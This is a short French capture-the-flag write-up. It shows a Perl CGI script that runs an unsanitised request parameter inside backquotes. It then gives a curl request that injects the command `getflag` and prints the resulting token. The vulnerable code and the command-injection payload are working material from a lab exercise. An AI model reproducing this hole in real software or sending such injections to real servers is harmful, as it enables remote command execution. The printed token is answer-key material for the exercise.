On trouve un script level04.pl

<pre><code>#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));</code></pre>

Après lecture, on voit qu'il s'exécute lorsqu'on effectue une requête sur localhost:4747 et qu'il prend un paramètre.

<pre><code>$ curl 192.168.56.102:4747?x=test
test</code></pre>

Avec "test" comme paramètre, le programme écrit testsur la sortie standard. On peut donc injecter une commande que le script exécutera avec ses droits grâce aux backquotes :

<pre><code>$ curl 192.168.56.102:4747?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap</code></pre>
